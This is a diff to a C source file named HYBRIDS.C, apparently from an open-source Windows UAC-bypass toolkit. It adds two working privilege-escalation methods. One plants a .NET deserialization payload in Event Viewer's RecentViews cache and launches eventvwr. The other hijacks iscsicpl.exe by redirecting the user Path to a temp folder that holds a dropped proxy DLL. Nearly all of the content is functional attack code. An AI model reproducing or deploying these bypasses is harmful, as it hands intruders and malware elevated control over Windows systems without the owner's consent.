@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     3.59
+*  VERSION:     3.63
 *
-*  DATE:        02 Feb 2022
+*  DATE:        16 Jul 2022
 *
 *  Hybrid UAC bypass methods.
 *
@@ -910,7 +910,6 @@ NTSTATUS ucmDccwCOMMethod(
         }
 
         if (CMLuaUtil == NULL) {
-            r = E_OUTOFMEMORY;
             break;
         }
 
@@ -942,7 +941,6 @@ NTSTATUS ucmDccwCOMMethod(
         }
 
         if (ColorDataProxy == NULL) {
-            r = E_OUTOFMEMORY;
             break;
         }
 
@@ -1125,6 +1123,194 @@ NTSTATUS ucmMsdtMethod(
 
     }
 
+
+#ifndef _WIN64
+    if (g_ctx->IsWow64) {
+        supEnableDisableWow64Redirection(FALSE);
+    }
+#endif
+
+#ifdef _DEBUG
+    supSetGlobalCompletionEvent();
+#endif
+
+    return MethodResult;
+}
+
+/*
+* ucmDotNetSerialMethod
+*
+* Purpose:
+*
+* Bypass UAC using DotNet Deserialization for eventvwr.
+*
+*/
+NTSTATUS ucmDotNetSerialMethod(
+    _In_ LPWSTR lpszPayload
+)
+{
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+    HANDLE hProcess = NULL;
+    PVOID dataBuffer;
+    DWORD dataSize;
+    LPWSTR lpAppData = NULL, lpTargetPath = NULL;
+    SIZE_T memIO;
+    WCHAR szTarget[MAX_PATH * 2];
+
+    do {
+
+        //
+        // Set payload as environment variable.
+        //
+        supSetEnvVariable(FALSE, NULL, MYSTERIOUSCUTETHING, lpszPayload);
+
+        //
+        // Drop RecentViews cache element to %AppData%.
+        //
+        if (FAILED(SHGetKnownFolderPath(&FOLDERID_LocalAppData, 0, NULL, &lpAppData)))
+            break;
+
+        memIO = (MAX_PATH + _strlen(lpAppData)) * sizeof(WCHAR);
+        lpTargetPath = (LPWSTR)supHeapAlloc(memIO);
+        if (lpTargetPath == NULL)
+            break;
+
+        _strcpy(lpTargetPath, lpAppData);
+        _strcat(lpTargetPath, TEXT("\\Microsoft\\Event Viewer\\RecentViews"));
+
+        if (g_ctx->dwBuildNumber < NT_WIN8_RTM) {
+            dataBuffer = (PVOID)g_encodedRecentViewsV2;
+            dataSize = sizeof(g_encodedRecentViewsV2);
+        }
+        else {
+            dataBuffer = (PVOID)g_encodedRecentViews;
+            dataSize = sizeof(g_encodedRecentViews);
+        }
+
+        if (!supDecodeAndWriteBufferToFile(lpTargetPath,
+            (CONST PVOID)dataBuffer,
+            dataSize,
+            'zzzz'))
+        {
+            break;
+        }
+
+        //
+        // Run eventvwr.exe as final trigger.
+        //
+        _strcpy(szTarget, g_ctx->szSystemDirectory);
+        _strcat(szTarget, MMC_EXE);
+        hProcess = supRunProcess3(szTarget, EVENTVWR_MSC, NULL, SW_SHOW);
+        if (hProcess) {
+            supWaitForChildProcesses(MMC_EXE, 50 * 1000);
+            CloseHandle(hProcess);
+            MethodResult = STATUS_SUCCESS;
+        }
+
+    } while (FALSE);
+
+    if (lpAppData) CoTaskMemFree(lpAppData);
+    if (lpTargetPath) {
+        DeleteFile(lpTargetPath);
+        supHeapFree(lpTargetPath);
+    }
+
+    supSetEnvVariable(TRUE, NULL, MYSTERIOUSCUTETHING, NULL);
+
+    return MethodResult;
+}
+
+/*
+* ucmIscsiCplMethodCleanup
+*
+* Purpose:
+*
+* Post execution cleanup routine.
+*
+*/
+VOID ucmIscsiCplMethodCleanup(
+    VOID
+)
+{
+    WCHAR szBuffer[MAX_PATH * 2];
+
+    _strcpy(szBuffer, g_ctx->szTempDirectory);
+    _strcat(szBuffer, ISCSIEXE_DLL);
+    DeleteFile(szBuffer);
+}
+
+/*
+* ucmIscsiCplMethod
+*
+* Purpose:
+*
+* Bypass UAC by dll hijack of iscsicpl.
+* https://github.com/hackerhouse-opensource/iscsicpl_bypassUAC
+*
+*/
+NTSTATUS ucmIscsiCplMethod(
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
+{
+    BOOL bValueSet = FALSE;
+    NTSTATUS MethodResult = STATUS_ACCESS_DENIED;
+    SIZE_T nLen;
+    WCHAR* pszOldEnvValue = NULL;
+    WCHAR szBuffer[MAX_PATH * 2];
+
+
+#ifndef _WIN64
+    if (g_ctx->IsWow64) {
+        ntStatus = supEnableDisableWow64Redirection(TRUE);
+        if (!NT_SUCCESS(ntStatus))
+            return ntStatus;
+    }
+#endif
+
+    do {
+
+        _strcpy(szBuffer, g_ctx->szTempDirectory);
+        nLen = _strlen(szBuffer);
+        if (szBuffer[nLen - 1] == L'\\') {
+            szBuffer[nLen - 1] = 0;
+        }
+
+        bValueSet = supReplaceEnvironmentVariableValue(NULL,
+            TEXT("Path"),
+            REG_EXPAND_SZ,
+            szBuffer,
+            (PVOID*)&pszOldEnvValue);
+
+        if (!bValueSet)
+            break;
+
+        _strcpy(szBuffer, g_ctx->szTempDirectory);
+        _strcat(szBuffer, ISCSIEXE_DLL);
+        if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize))
+            break;
+
+        _strcpy(szBuffer, USER_SHARED_DATA->NtSystemRoot);
+        _strcat(szBuffer, SYSWOW64_DIR);
+        _strcat(szBuffer, ISCSICPL_EXE);
+        if (supRunProcess2(szBuffer, NULL, NULL, SW_HIDE, 5000))
+            MethodResult = STATUS_SUCCESS;
+
+    } while (FALSE);
+
+    if (pszOldEnvValue) {
+
+        supReplaceEnvironmentVariableValue(NULL,
+            TEXT("Path"),
+            REG_EXPAND_SZ,
+            pszOldEnvValue,
+            NULL);
+
+        supHeapFree(pszOldEnvValue);
+    }
+    else {
+        supRegCurrentUserDeleteSubKeyValue(TEXT("Environment"), TEXT("Path"));
+    }
 
 #ifndef _WIN64
     if (g_ctx->IsWow64) {
